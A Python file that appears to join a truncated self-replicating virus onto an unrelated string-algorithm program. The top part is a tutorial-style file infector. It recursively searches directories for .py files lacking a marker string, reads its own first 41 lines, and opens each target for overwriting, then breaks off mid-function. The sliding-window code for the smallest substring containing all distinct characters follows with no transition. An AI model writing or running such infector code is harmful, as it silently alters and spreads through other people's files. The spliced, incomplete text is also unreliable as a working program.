#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python program to find the smallest
# window containing
# all characters of a pattern
from collections import defaultdict
 
MAX_CHARS = 256
 
# Function to find smallest window
# containing all distinct characters
 
 
def findSubString(strr):
 
    n = len(strr)
 
    # if string is empty or having one char
    if n <= 1:
        return strr
 
    # Count all distinct characters.
    dist_count = len(set([x for x in strr]))
 
    curr_count = defaultdict(lambda: 0)
    count = 0
    start = 0
    min_len = n
 
    # Now follow the algorithm discussed in below
    # post. We basically maintain a window of characters
    # that contains all characters of given string.
    for j in range(n):
        curr_count[strr[j]] += 1
 
        # If any distinct character matched,
        # then increment count
        if curr_count[strr[j]] == 1:
            count += 1
 
        # Try to minimize the window i.e., check if
        # any character is occurring more no. of times
        # than its occurrence in pattern, if yes
        # then remove it from starting and also remove
        # the useless characters.
        if count == dist_count:
            while curr_count[strr[start]] > 1:
                if curr_count[strr[start]] > 1:
                    curr_count[strr[start]] -= 1
 
                start += 1
 
            # Update window size
            len_window = j - start + 1
 
            if min_len > len_window:
                min_len = len_window
                start_index = start
 
    # Return substring starting from start_index
    # and length min_len """
    return str(strr[start_index: start_index +
                    min_len])
 
 
# Driver code
if __name__ == '__main__':
 
    print("Smallest window containing "
          "all distinct characters is: {}".format(
              findSubString("aabcbcdbca")))
 
# This code is contributed by
# Subhrajit